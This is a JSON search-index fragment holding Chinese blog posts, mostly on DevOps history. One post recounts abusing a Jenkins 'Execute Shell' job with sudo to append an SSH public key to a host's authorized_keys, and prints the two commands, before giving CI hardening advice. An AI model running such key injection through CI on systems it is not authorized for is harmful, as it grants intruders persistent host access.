2017","permalink":"/blog/2017/2017-05-02-devops-in-tech-radar/","section":"Blogs","summary":"","title":"DevOps发展的九个趋势"},{"content":"最近临时接手了一个客户测试环境和产品环境的维护工作。接手的客户资产里包含：代码库，生产环境主机，测试环境主机以及搭建在测试环境主机上的CI（基于Jenkins）。这个CI可以用来部署测试环境和生产环境的应用。\n不久，接到了客户的一个维护请求：把最新的生产环境数据同步到测试环境里。\n这个维护工作需要通过SSH登录到测试环境主机上进行操作。测试主机是通过 authorized_keys 进行 SSH 认证的，因此没有用户名和密码。这样有两个好处：一方面无需生产环境用户名密码。一方面可以按需吊销不再用的客户端。这样可以避免密码泄露。所以我需要把自己的 ssh public key 交给管理员，让他把我的 key 加到可访问列表里。\n悲剧的是，管理员告诉我他的 key 因为更换电脑的关系没有及时更新。所以，他也登录不上去了。而且之前所有的管理员的 key 都失效了。我手上只有CI的管理员的用户名和密码，于是一个邪恶的想法就诞生了：\n既然 CI 可以执行脚本，那么我是否可以通过CI把我的key注入进去 ？\n于是我用Execute Shell的Job变成了我的命令行，通过CI运行日志得知了宿主用户的文件目录信息。然后把自己的ssh public key加到了登录列表里（此处省略敏感信息）：\n1 2 sudo sh -c “cp \\~/.ssh/authorized\\_keys \\~/.ssh/authorized\\_keys.bak” sudo sh -c \u0026#34;echo ‘{**你的****ssh public key**}’ \\\u0026gt;\\\u0026gt; \\~/.ssh/authorized\\_keys\u0026#34; It works !\n我成功的登录了机器，但这却暴露了一个问题：CI有可能会成为一个安全隐患。\n首先，CI可以执行代码。这就意味着它有可能执行有害代码。\n其次，CI缺乏足够的用户鉴权，这很有可能导致未授权用户访问。\n那么，如何构建一个更安全的 CI 服务器 #rootless原则 # “神操纵着万物，你感觉得到他，但永远看不见他。” ——《圣经·希伯来书 11:27》\n在服务器的世界里，root用户就是神，具有至高的权力和力量。如果有人获得了”神力“，后果可能不堪设想。\n无论是Web服务器，还是CI服务器。都是这个世界里的二等公民，权限和力量都应该受到约束。执行的时候应该“\n此外，应该极力避免sudo的滥用，尤其是对那些从外部访问的用户。很多情况下，为了操作方便，很多用户都有sudo的权限。但这恰恰造成了低权限用户提升自己的访问权限进行有害操作。\n在上述的故事里，因为没有对Jenkins的主机用户做有效的隔离，导致了我可以用sudo注入自己的key获得机器的访问权限。\n沙盒隔离原则 #因为CI会执行脚本或运行程序，而这些程序和脚本极有可能是不安全的。所以，CI任务应该在隔离的安全沙盒中执行，例如：受限的用户，受限的权限，受限的空间。\n在上述的故事里，我就通过CI执行了一段不安全的脚本成功获得了登录主机的权限。\n如果这些任务执行在隔离并受控的Docker容器里，那么会安全得多。\n也可以考虑采用TravisCI这样的第三方CI服务来保证安全性。\n备份和备份核查原则 #在上述的故事里，因为缺乏有效的备份机制，导致了所有人都失去了对主机的访问。此外，我在修改authorized_keys的时候先进行了备份。这样，如果我注入失败，还可以还原。\n这里的备份，不光是对配置，数据的备份，还有岗位的备份。\n如果有备份的管理员，完全不会出现这种事情。\n如果有备份QA服务器，完全可以不需要当前的QA服务器。\n在做任何变更前，都应该做好备份以及还原的准备。因为任何变更都会带来“蝴蝶效应”。\n但是，光备份是不够的。如果备份不能有效还原，那和没有备份没有什么区别。所以，要定时的进行备份恢复测试。确保备份在各种情况下可用。\n多重要素身份验证原则 #上述的CI是暴露在互联网中的，任何一个人访问到这个站点，通过一定程度的密码破解，就可以获得这个CI的访问控制权限。从而可以做出上述的操作。\n所以，有了用户名和密码，并不一定是可信用户。所以需要通过更多的手段，诸如手机短信验证码或者第三方认证集成来验证用户的身份。\n关键操作手动验证原则 #试想一下，如果上述的例子我并没有服务器的访问权限。而是通过提交未经审查的代码自动运行测试脚本。实际上也会造成同样的效果。\n有时候我们会为了方便，让CI自动触发测试。但是，恰恰是这种“方便”，却带来了额外的安全隐患。而这样的方便，不光方便了自己，也方便了恶意入侵者。\n所以，不能为了方便而留下安全隐患。在关键操作上设置为手动操作，并通过一定的机制保证关键操作的可靠性才是最佳实践。\n构建安全 CI 的几个实践 # 采用Sibling的方式在Docker里运行CI任务。 账户密码管理统一采用LDAP认证，如果过期则从外部修改。 CI的登录权限和其它的认证方式（比如GItHub，Okta等）集成起来。并用组限制登录。 对于生产环境的CI，通过更加细粒度的权限限制来隔离一些危险操作。 官方的安全指南 #不少CI软件的官方都提供了最佳实践以及安全指南帮助我们更好的构建CI服务器。请务必在构建CI前阅读并理解这些安全实践和措施，并遵照安全最佳实践构建CI服务器：\nJenkins 最佳实践：https://wiki.jenkins-ci.org/display/JENKINS/Jenkins+Best+Practices\nJenkins 官方安全指南：https://wiki.jenkins-ci.org/display/JENKINS/Securing+Jenkins\n如果没有这些如果 #上面提到了太多的如果。如果这些“如果”能发生在事前，这些问题就不会产生。CI本身是开发的最佳实践，但如果缺乏安全的意识，一味的追求方便和高效，则会带来很大的安全隐患。技通过一些简单而基础的措施和手段，我们就能大大的减少安全隐患。\n感谢 ThoughtWorks 高级咨询师赵朝朝，蒋帆对本文的建议。\n","date":"March 3, 2017","permalink":"/blog/2017/2017-03-03-your-ci-may-be-under-attack/","section":"Blogs","summary":"","title":"不要让你的持续集成服务器成为安全隐患"},{"content":"在 #DevOps的前世今生# 2. Dev和Ops矛盾缘何而来？一文中，通过Dev和Ops的历史发展总结出了Dev和Ops矛盾的历史渊源，以及 Dev 和 Ops 的核心矛盾：\nDev和Ops 的矛盾主要是面向适应性的敏捷软件交付和面向经验性的传统运维之间的矛盾。\n但这个矛盾最先 John Allspaw 和 Paul Hammond在 “10+ Deploys Per Day： Dev and Ops Cooperation at Flickr” 提出，并以“Cooperation”作为整个演讲的核心，讲述了他们解决这个矛盾的实践经验。这个演讲中：\n重新定义Ops的工作目标 #在一个组织中，如果相关利益者的利益不一致，在既定流程的进行中一定会碰到诸多阻力。而在这一点上，首先做得就是把 Dev 和 Ops 的利益一致化，从而减少Ops对软件交付的阻力。在演讲中，John Allspaw 和 Paul Hammond 首先挑战的是对 Dev 和 Ops 的传统观点。\n传统的观点认为Dev和Ops的工作是不同的：\nDev的工作是增添新的功能。\nOps的工作是保证站点的稳定和高性能。\n他们认为，保证站点的稳定和高性能不是 Ops 的工作目标。\nOps的工作目标应该是激活业务（enable the business），而这一点和Dev是一致的。\n理想往往是美好的，现实往往是残酷的。激活业务会带来更多的变更，而更多的变更会引起故障！\n面对这样的问题，就需要做出一个选择：为了保障稳定性减少变更，还是及时按需变更？\n阿拉伯有一个谚语：“你若不想做，会找到一个借口。你若想做，会找到一个方法。”\nFlicker 并没有屈服于压力，他们选择让问题向目标妥协，而不是目标向问题妥协。他们的手段是：\n构建相互合作的工具和文化 #降低变更风险的关键就是在于提高可靠性，这不仅仅是Dev在软件开发中，也需要Ops把可靠性通过非功能性需求（性能要求，扩展性，安全性等）注入到软件开发过程中。通过系统交付过程中的质量內建而不是事后检验来提升交付质量。\n而 Dev 和 Ops 的具体矛盾点表现在以下两方面：\n在价值流下游的 Ops 评审认为价值链上游的 Dev 软件非功能质量不满足要求，因此阻止变更。\n在价值流上游的 Dev 无法获得价值链下游的 Ops 的真实运行环境，因此无法提升交付质量。\n于是，逐渐陷入了“无法提升质量”和“ 非功能质量不满足要求”的死循环中。\n由于在 Dev 环节关心的是功能性需求，往往忽略了非功能性需求，而 Ops 更关注的是非功能性需求。所以通过质量內建，把运维加入开发反馈环。在开发环节中增加非功能性的需求的实现和验收，让 Ops 担任最终的 QA 的角色。从而提升了交付质量，也提升了反馈速度。\n首先，他们通过**基础设施自动化（Automated infrastructure）**提升了基础设施准备的质量和效率。\n其次，他们搭建了Dev和Ops 交付的桥梁：**共享版本控制（Shared Version Control ）并且通过功能开关（Feature flags ）**管理功能发布。\n然后，通过**一步构建和部署（One step build and deploy ）以及频繁进行小变更（Small frequent changes）**提升单向价值流速度并降低部署风险。\n最后，采用共享运维指标（Shared metrics ），和**即时消息工具集成（IRC and IM robots ）**提升沟通效率以做到及时反馈并进行改进。\n但仅仅有这些是不够的，还需要构建出合作的文化。合作的文化的构建关键在 Dev 和 Ops 之间的尊敬，相互信任，以及面对失败的改进而非指责的态度。\n第一届 DevOpsDays 在继承了这些思想的方向上则走的更远。第一届 DevOpsDays 吸引了更多关注于这一领域的人群，它们甚至都不具备技术背景。\nDevOps的目标——提升软件交付的质量內建以加速流程 #在第一次 DevOpsDays 会议后，作为 DevOpsDays 活动的发起人和 DevOps 这个词的创始人，Patrick Debois 随后总结并写下了“Charting out devops ideas”一文，他把第一届 DevOpsDays 这也成为后续 DevOps 运动的理念基石。在这篇文章里，Patrick从第一届DevOps活动中有了两个重要的观察，分别是：\n1. DevOps 是在业务、交付流程和运维之间反馈环中增加了一个反馈环。\n2. 因为有了这样一个环节，我们可以提升质量以加速流程。\n简而言之，DevOps 是把运维（Ops）加入到了价值流的反馈环中。并且通过提升软件交付的质量內建以加速价值链端到端的反馈效率。\n而要实现这一目标，要通过一些手段。\nDevOps的手段——技术升级和流程管理 #于此同时，Patrick 发现， DevOpsDays 的所有话题都围绕着两条主线：**技术（technologies）**和 流程管理（process management），而这些话题又相互交织在一起形成了四个不同的反馈环，如下图所示。其中蓝色气泡代表技术，黄色气泡代表过程管理：\n开发-测试反馈环（黑色箭头反馈环） #技术方面：\n由非功能特性(扩展性，可用性)驱动的软件架构：用NO-SQL数据库或队列系统（Queue System）增加系统的可扩展性，以及混合使用编程语言和memcache这样的缓存系统。\n过程管理方面：\n拉近软件开发和系统工程的交互：采用敏捷团队或者其它形式的多功能团队跨越不同的部门墙。\n开发-运维反馈环（绿色箭头反馈环） #技术方面：\n系统管理员采用软件开发技术：使用代码仓库、持续集成、测试工具、设计模式来自动化的处理系统的初始化操作。\n部署的配置管理：采用配置管理以及自动化配置工具（Chef，Puppet）用于部署和生产环境的变更。\n测试和监控相互辅助：在监控系统中复用自动化测试逻辑（比如：cucumber-nagios），在测试环境中使用监控手段验证测试场景。\n运维团队开发新的系统管理工具：工具也是技术水平差距的重要体现，很多系统管理员开发新的工具用来处理大规模的部署，变更以及监控。\n过程管理方面：\n拉近软件开发和系统工程的交互：敏捷项目或者其他形成多功能团队的方法替代不同的部门墙。\n项目从运维中学习：架构在项目中不断获得反馈，从而知道哪些可以用，哪些不能用。这样可以得到更好的架构设计。\n业务-运维反馈环（红色箭头反馈环） #技术方面：\n基于云计算和敏捷基础设施的新系统架构：云计算和敏捷的基础设施可以获得更好和更先进的自动化部署手段和系统初始化手段。\n过程管理方面：\n业务部门应当同时关注功能和非功能需求：业务应当开始关注停机时间和数据丢失带来的影响。\n运维团队参与过程上游而不是被动的角色：在运维中采用看板在项目阶段进行互动，甚至可以用在项目前的阶段（销售、服务水平管理）。\n运维团队自组织以应对业务挑战：例如把敏捷引入运维(agile operations)或把精益引入运维(lean operations)。\n**业务使用运维指标作为反馈：**要了解用户喜欢什么，如何行动。为了做出更好的业务决策，性能降低或故障中断正在成为一个重要的反馈回路。\n业务-用户反馈环（紫色箭头反馈环） #过程管理方面：\n**运维作为用户问题的第一个响应人：**运维人员和销售人员一样，都可以作为处理用户的问题的一线，并反馈给业务部门。\n通过以上四个反馈环我们发现两个关键点 # DevOps 不仅仅是IT部门的事情，他涉及到IT部门以外的部门，包括最终用户。在脱离像 Flicker 这样的互联网公司这个大背景下。企业级IT部门采用 DevOps 还会遇到更多外部挑战**。\n新的技术，尤其敏捷软件开发观念的深入和大规模基础设施（虚拟化，云计算，SDN）的不断发展让 Ops 以 Dev 的方式工作成为可能。**\n总结 #第一届DevOpsDays秉承着Velocity 09中 “Dev and Ops Cooperation”的理念汇集了世界上所有关注于解决 Dev和 Ops 矛盾的有志之士。然而，通过大家的交流，发现软件交付的问题并不仅仅是 Dev 和Ops合作那么简单，通过文章我们发现：\nDevOps 本质是一场以提升质量內建为手段，以加速软件系统价值流反馈为目标的技术提升和管理变革\n但是，DevOps 运动后续的发展却并不顺利：\n一方面，由于 DevOps 这个很短的单词中包含了太多的概念，又缺乏足够的限定，使得 DevOps 的概念很模糊。让不同的人对于 DevOps 的理解千差万别。\n另一方面， 来自传统运维对 DevOps 的批评也让这种基于社区（集市）而非基于专业性组织（大教堂）产生了质疑。由于缺乏系统化的方法论，使得更多的企业在实践 DevOps 中处于观望或低水平的软件工具升级阶段。\n然而，DevOps 的实践者们仍然在不断总结和完善。使得 DevOps 的文化价值体系渐渐成型，使得大家能够更好的理解和实践 DevOps。请期待下篇 #DevOps的前世今生# 4. DevOps的文化\n感谢ThoughtWorks 高级咨询师 马博文，伍斌，黄博文给本文提出的宝贵意见。\n参考链接 #http://cdn.oreillystatic.com/en/assets/1/event/29/10+%20Deploys%20Per%20Day_%20Dev%20and%20Ops%20Cooperation%20at%20Flickr%20Presentation.pdf\nhttp://www.jedi.be/blog/2009/12/22/charting-out-devops-ideas/\nhttp://www.jedi.be/blog/2010/02/12/what-is-this-devops-thing-anyway/\nhttps://www.devopsdays.org/\nhttps://theagileadmin.com/what-is-devops/\n","date":"February 14, 2017","permalink":"/blog/2017/2017-02-14-core-devops-concepts/","section":"Blogs","summary":"","title":"DevOps 前世今生 - 3. DevOps 的目标和核心"},{"content":"在 #DevOps的前世今生# 1.DevOps编年史一文中，通过追溯 DevOps 活动产生的历史起源，我们发现了 DevOps 是敏捷思想从软件开发端(Dev)到系统维护端(Ops)的延伸。无论是 DevOpsDays 的创始人 Patrick Debois，还是同时期的 The Agile Admin。都想通过敏捷来改进传统的系统维护工作以及软件开发部门和系统维护部门的合作关系。但是，DevOps 的矛盾从何而来？这还要从 Dev 和 Ops 的起源开始讲起。\n上古时代——抱着计算机使用手册，自开发自运维 #历史要追溯到刚刚出现计算机的时期。当时，软件开发还是少数人通过高学历才能够掌握的技能，那个时候只有“程序”（Program），但没有“软件”（Software），所以那个时候编写程序的人员被称为“程序员”（Programmer）。基本的学习材料还只是计算机设备厂商附送的使用手册。所以，只能先购买设备，再自己培养人才。\n最先购买计算机的是科研单位，军队，政府以及少数大型企业。同时组建了新的部门，成立了信息技术部（IT Department)，或者叫信息化办公室（IT Office）。在中国的有些单位里干脆直接叫“电脑部”。他们一个科室，一个办公室主任，外加两三个科级干部和几个科员，专门管理这些电脑的使用情况，并且学习软件编程技术，用程序来解决其它各部门的。\n这是最初的IT运维雏形，在这个时期是没有 Dev 和 Ops 之分的，他们统称为 Programmer。由于开发和运维都由同样的人包揽，自己维护自己开发的程序，也可以被看做是原始的 DevOps。这个时期的计算机系统和问题较简单，开发和维护并不复杂，无需进行专业区分。\n桌面通用软件时代——软件成为了一门生意，出现了专业的软件开发工程师（Dev） #随着计算机的成本不断下降，尤其是以 IBM PC 为代表微型计算机（ MicroComputer ）开始普及。企业也开始大规模使用计算机进行办公。由于软件开发人员数量仍然很少，加之需求很旺盛，专业的软件开发人员成本依然高昂。\n最开始的时候，软件仅仅通过磁盘拷贝进行流传，某些介绍计算机或者软件的杂志开了先河。程序员通过磁盘向杂志社投稿，杂志社通过变卖杂志和软件获利。由于软件的边际生产成本几乎是0，所以渐渐有人把销售软件变成了一门生意。随着软件的扩展，当初为个人目的（Personal Purpose）所编写的软件渐渐的开始走通用化的路线，慢慢形成了软件产品。接着有了专门从事软件开发的公司，并逐渐成为一个产业。并且有了软件开发工程师（Developer，简称Dev）这个职业。\n在这个时期，开发软件仍然是很专业的事情，企业的IT部门要想开发软件的代价十分高昂。因此，大部分单位，组织和企业通过购买的形式获得软件。IT部门逐渐成为了负责信息化采购以及软硬件基本操作培训的部门。此外，由于信息化发展加速，各行各业软件层出不穷，加之软件企业越来越多，IT部门不得不通过更广泛的学习了解技术的变化。\n企业级定制化软件时代——企业级应用的快速发展，出现了专业的系统维护工程师（Ops） #随之带来的问题是：无论企业买来多少软件，企业的信息化需要仍然无法被满足。一台台电脑成为了企业的信息孤岛，解决了信息的分析和存储问题最多实现了无纸化办公。没有让部门间的信息有效的流动起来。大型企业最先发现这些问题并且给出了最初的解决方案，使得企业级软件开发和系统集成（System Integration）慢慢成为了一个热门的领域。\n企业级软件系统最大的特点是通过计算机网络解决了企业内部的信息孤岛。但这样的系统无法在PC上运行需要专业的工作站，服务器以及网络设备。而这些设备的管理就理所当然的成为了企业IT部门的职责。\n随着软硬件技术的发展，特别企业级应用开发的经验不断积累，设备的采购成本和软件的开发成本进一步降低。大型IT厂商开始瞄准企业级应用市场，尤其是IBM，Oracle和EMC推出了相应的产品。使得软件定制开发的成本不断下降。加之随着开发人员越来越多，开发成本逐渐降低，于是出现了企业定制化软件开发，出现了MIS和ERP这样的应用以及J2EE这样的企业级软件开发框架。\n在这个过程中，IT运维的概念逐渐产生，维基百科上是这样定义IT运维（IT Operations）的：\nIT Operations is responsible for the smooth functioning of the infrastructure and operational environments that support application deployment to internal and external customers, including the network infrastructure; server and device management; computer operations; IT infrastructure library (ITIL) management; and help desk services for an organization.\n翻译成中文就是：\nIT运维的责任是要为内部和外部客户的应用部署提供平滑的基础设施和操作环境，包括网络基础设施，服务器和设备管理，计算机操作，ITIL管理，甚至作为组织的IT帮助中心。\n对于企业的IT部门来说，工作就不仅仅是维护计算机和网络这些设备了。还要包括运行在上面的软件系统，尤其是定制化的企业级软件产品。因此在定制化企业级软件交付从乙方交付给甲方的时候就需要一系列的技术审查以确保质量，这就使得原本不需要关心软件是如何开发的企业IT部门提出了更高的要求。他们必须提升专业水准以应对这样的变化。同时需要重新思考整个IT部门的服务管理和设计。随着IT部门知识和服务专业度的提升，促生出了了ITIL（Information Technology Infrastructure Library，信息技术基础设施库）这样的最佳实践库，也使“系统维护工程师”（Ops）更加专业化。\n在这个时期，Dev和Ops的矛盾，主要是由Dev所代表的乙方和Ops所代表的甲方在定制化软件产品交付质量上的矛盾。\n敏捷软件开发时代——应对频繁变更的挑战 #随着企业级软件开发日趋完善和成熟，形成了以RUP（Rational Unified Process，Rational 统一软件开发过程）为代表的方法论。RUP描述了如何有效地利用商业的可靠的方法开发和部署软件，是一种重量级过程（也被称作厚方法学），因此特别适用于大型软件团队开发大型项目。\n后来，互联网企业的繁荣着实闪瞎了世界的眼睛。没有人想到原本用来进行国防和科研的广域网居然可以带来这么大的商业价值。互联网创业公司的成功不断的颠覆了很多人习以为常的事情，特别是IT产业。\n首先，相较于最多万人的用户访问规模，来自互联网的千万级甚至是亿级的访问规模是企业级应用不曾遇到过的。这对软件开发，主机管理，网络架构都带来了很大的挑战。\n其次，企业级应用和互联网应用面对的问题是不一样的。根据“康威定理”：设计系统的组织，其产生的设计和架构等价于组织间的沟通结构。相较于有着清晰的等级和部门分工的组织来说，互联网产品的沟通结构更加复杂。\n此外，互联网应用由互联网企业自开发自维护。虽然从表面上看没有了甲方和乙方的对立。但开发和运维相互分离的工作流程和考核方式却沿用了下来，职责上的对立依然存在：\nDev的工作是给应用系统增加新的功能/修复软件的Bug，这一系列价值的产生是通过应用系统变更实现的。一般的组织会用代码/功能的贡献数量作为KPI作为考核的依据，以激励Dev的工作产出。\nOps的工作则是让应用系统保持稳定和高性能，即最大化缩短宕机时间并能够提升应用系统的性能，并以这两者作为Ops的KPI的考核指标。以激励Ops通过维护工作使应用系统能够按照预期稳定的产出价值。\n而市场环境的瞬息万变和资本的集中化使得互联网软件产品的生存状态十分脆弱：\n一方面，快速变化的市场难以预测。因此，基于经验的重量级软件开发方法不再适用。取而代之的是强调适应性，拥抱变化的敏捷方法。互联网软件必须通过频繁增加/修改功能来提升自身对市场的适应程度。\n另一方面，互联网软件的变更给带来的风险和损失都是难以度量的。因此，互联网软件有更加严格的交付标准，需要做更多的质量保证。而基于经验的系统运维实践并没有给出足够的方法以应对这种挑战。\n因此，在这个时期，Dev 和 Ops 的矛盾主要是面向适应性的敏捷软件交付和面向经验性的传统运维之间的矛盾。\n那么，如果将敏捷的文化和原则引入运维，会如何？\n请期待下一篇： #DevOps的前世今生# 3.DevOps的文化和原则\n感谢ThoughtWorks总监咨询师史凯对本文的改进意见和建议。\n参考资源 #https://en.wikipedia.org/wiki/Information_technology_operations\nhttps://en.wikipedia.org/wiki/Software_developer\nhttps://en.wikipedia.org/wiki/Management_information_system\nhttps://en.wikipedia.org/wiki/Enterprise_resource_planning\nhttps://en.wikipedia.org/wiki/Rational_Unified_Process\nhttp://agilemanifesto.org/iso/zhchs/manifesto.html\nhttps://theagileadmin.com/what-is-devops/\nhttp://www.jedi.be/blog/2009/12/22/charting-out-devops-ideas/\nhttp://itrevolution.com/the-convergence-of-devops/\nhttp://joehertvik.com/operations-management/\nhttps://zh.wikipedia.org/wiki/IBM-Rational%E7%BB%9F%E4%B8%80%E8%BF%87%E7%A8%8B\nhttps://zh.wikipedia.org/wiki/%E6%95%8F%E6%8D%B7%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91\nhttp://www.infoq.com/cn/news/2015/08/itil-vs-devops/\n","date":"January 27, 2017","permalink":"/blog/2017/2017-01-17-where-did-devops-issues-come/","section":"Blogs","summary":"","title":"DevOps 前世今生 - 2. DevOps 矛盾从何而来"},{"content":"2007 年：比利时，一个沮丧的独立IT咨询师 #DevOps的历史要从一个比利时的独立IT咨询师说起。这位咨询师的名字叫做**Patrick Debois，**他喜欢从各个角度研究IT组织。\n2007 年，Patrick参与了比利时一个政府下属部门的大型数据中心迁移的项目。在这个项目中，他负责测试和验证工作。所以他不光要和开发团队（Dev）一起工作，也要和运维团队（Ops）一起工作。他第一天在开发团队跟随敏捷的节奏，第二天又要以传统的方式像消防队员那样维护这些系统，这种在两种工作氛围的切换令他十分沮丧。\n他意识到开发团队和运维团队的工作方式和思维方式有巨大的差异：开发团队和运维团队生活在两个不同的世界，而彼此又坚守着各自的利益，所以在这两者之间工作到处都是冲突。作为一个敏捷的簇拥者，他渐渐的明白如何在这种状况下改进自己的工作。\n2008 年 6月：美国旧金山，第一届 Velocity 大会 #2008 年，在美国加州旧金山，O\u0026rsquo;Reilly出版公司举办了一场名为Velocity的技术大会，这个大会的话题范围主要围绕Web应用程序的性能和运维展开。这个会议被设计用来分享和交换构建和运维Web应用的性能、稳定性和可用性上的最佳实践。\n2008 年 8月：加拿大多伦多，Agile Conference 2008 大会埋下了DevOps的种子 #同年 8月，在加拿大多伦多的 Agile Conference 2008（敏捷大会）上，一位名为 Andrew Shafer 的人提交了一个名为“Agile Infrastructure”的临时话题。由于对这个临时话题感兴趣的人不多，Andrew 认为没人会对如何 跨越 Dev 和 Ops 的鸿沟 这个话题感兴趣。所以当这个话题时间开始的时候，作为话题提交人的 Andrew 并没有出现。\n但是话题开始的时候，仅有一个人出席。这个人就是上文提到的IT咨询师 Patrick 。Partrik 在这次会议上分享了自己的话题：**如何在运维工作中应用 Scrum 和其它敏捷实践。**他十分想把这些经历和别人分享。\n最终，Patrick 在会议厅的走廊里找到了 Andrew，并进行了一场漫长的讨论。他们意识到在这次会议之外会有很多的人想要继续探讨这个广泛而又系统化的问题。\n尽管在这次会议中，持续集成的流行已经使敏捷实践慢慢走向部署了。可是这仍然把运维工作和开发完全割裂开。于是他俩决定在 Google Group 上建立了一个 Agile System Adminstration 的讨论组继续这个话题。虽然有一些话题和参与者，但是访问者寥寥。\n2009 年 6月：美国圣荷西，第二届 Velocity 大会上一个轰动世界的演讲 #这一年的 Velocity 大会最大的亮点是一个名为“10+ Deploys Per Day: Dev and Ops Cooperation at Flickr”的演讲，几乎所有的和 DevOps 相关的资料都会把这个演讲作为 DevOps 的引用。这个演讲的内容可以作为 DevOps 萌发的标志。这个演讲提出了了 DevOps 的“一个中心，两个基本点”——以业务敏捷为中心，构造适应快速发布软件的工具（Tools）和文化（Culture）。\nPatrick 在网上看到了这个视频后很兴奋，因为这就是他一直致力于的领域。于是他在Twitter 上问如何才能参加 Velocity 大会。\n其中有个人回复: 嘿，Patrick，你想在比利时召开自己的 Velocity 吗？我们都会去参加，这一定会很棒。于是，Patrick 就想通过 Twitter 召集开发工程师和运维工程师在比利时举办一个类似于 Velocity 的大会。\n2009 年 10 月：比利时根特，第一届 DevOpsDays #如果要召开一个会议，就得有一个名字。Patrick 首先就想到了Dev和Ops，由于这个会议会持续两天，所以他加上了 Days，于是就有了 DevOpsDays。由于 Twitter 上有140个字符的限制，因此他想用 DOD 作为 DevOpsDays 的缩写以提醒自己“死在交付上”（Dead On Delivery），但不知什么原因，最后没有这么做。\n虽然这是一届“社区版 Velocity 大会”，但这届大会出乎意料的成功。人们从世界各地蜂拥而至，除了开发工程师和运维工程师，还有各种IT管理人员和工具爱好者。两天的会议已经结束后，参与 DevOpsDays 的人们把这次会议的内容带回到了世界各个角落。\n然而， DevOpsDays 的讨论仍在 Twitter 上继续着。由于 Twitter 140个字符的限制，大家在 Twitter 上去掉了 DevOps 中的 Days，保留了 DevOps。于是， DevOps 这个称谓正式诞生。\n2010 年：DevOpsDays 确立了 DevOps 的原则和方向 #在第一届 DevOpsDays 之后，DevOps 的火种被吹到了世界的各个角落。2010年，在欧洲，北美洲，南美洲，大洋洲分别举办了各自的 DevOpsDays。\n在 DevOpsDays 之后，DevOps 被越来越多的人所熟知并迅速得到了大多数人的认可。人们认为这正是IT部门的正确运作方式，DevOps 成为了一种促成开发运维合作的**运动。**人们在各种场所和活动中不断分享自己的经验和见解，并催生了很多工具和实践的产生。但是，每个人对 DevOps 的理解都有所不同，争议在所难免。\n可以说，没有这一年的 DevOpsDays，DevOps 便只是昙花一现， 夭折在了比利时的某个酒店里。而这一年的 DevOpsDays，也是 DevOps 运动的立足和确立之年，DevOps 实践的原则和方向由此确立。\n《持续交付》的作者 Jez Humble 参加了位于德国汉堡的第二届的 DevOpsDays 并做了 “持续交付”的演讲。从本质上说，《持续交付》中所提到的实践给 Patrick 和 Andrew 最初所遇到的问题给出了全面的解决方案。如果《持续交付》早两年问世，也许就没有 DevOps 了。然而，随着 DevOps 理念的传播和发展，DevOps 的概念的外延越来越广。DevOps 的内容已经超出了《持续交付》本身所涵盖的范畴。后来，Jez Humble 成为了《 DevOps Handbook 》的作者之一。\n“持续交付”是“持续集成”的延伸，而这点恰恰和2008年敏捷大会中的观念一致。但由于发生时间的先后关系，“持续交付”被看作是敏捷以及 DevOps 文化的产物。而今，持续交付仍然被作为DevOps的核心实践之一被广泛谈及。\n除了德国汉堡，远在大洋彼岸的美国加州的 Montain View 也举办了 DevOpsDays，这届 DevOps 可谓众星云集：\nPatrick Debois， 从比利时来到了加州，作为基础设施即代码的出品人，把基础设施即代码正式纳入 DevOps。\nAndrew Shafer， 作为 DevOps 文化的出品人，分别讨论了不同 IT 组织的管理和文化实践。\nGene Kim，《凤凰项目》和《DevOps Handbook》的合作者之一，讨论了 DevOps 在 Web 运维以外实践的可能性。\nJohn Allspaw，在 Velocity 09 大会之后，离开了 Filcker，加入了 Etsy，讨论了 DevOps 文化相关的话题。\nJohn Willis，《DevOps Handbook》的合作者之一。作为云计算和 DevOps 相关方面的出品人\nDamon Edwards，DevOps 可视化的出品人，和 John Willis 一起在本次 DevOpsDays 之后提出了 CAMS 原则，并在 Jez Humble 提出 Lean 之后变成 CLAMS 原则，使之成为 DevOps 实践的指导原则。\nErnest Mueller 作为 The Agile Admin 博客的维护者，在参加了本次 DevOpsDays之后，发表了“ What is DevOps ”这篇文章。该文给出了详细 DevOps 的定义，并且依据敏捷的体系构造出了DevOps 的体系: 它包括一系列价值观、原则、方法、实践以及对应的工具。并且梳理了 DevOps 的历史和对DevOps 的一些误解。至此，DevOps 的原则和方向成型。\nDevOps是敏捷运动在IT部门内的延伸 #通过以上的历史我们可以看到，Patrick 最开始遇到的是IT部门内部在敏捷软件开发和传统系统维护之间的矛盾。这样的矛盾使他有了用敏捷来变革系统维护的想法，于是他采用 Scrum 和其它敏捷实践改进了运维工作。\n同时，远在美国Austin的几个Web工程师也有了类似的想法，因而产生了 The Agile Admin 博客。直到 Velocity 09 正式提出“ Dev and Ops Cooperation ”人们才意识到解决IT部门内部的这个矛盾带来的巨大价值。\n解决这个矛盾的第一步，就是要统一价值观：运维工程师的工作的目标不仅仅是让Web站点稳定和高效，更需要支持业务的快速演化——这点是和敏捷软件开发的目标是一致的。\n当我们重新回头看看敏捷宣言以及敏捷软件的12条原则。我们会发现，作为软件交付的流程末端，把Ops当做“客户”是十分合适的，当你把运维人员当做客户。在IT部门提升“个体和互动”，加强“客户合作”，一起“响应变化”，部署“工作的软件”实际上就得到了DevOps。\n","date":"November 27, 2016","permalink":"/blog/2016/2016-11-27-devops-annals/","section":"Blogs","summary":"","title":"DevOps 前世今生 - 1. DevOps 编年史"},{"content":"","date":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories"}]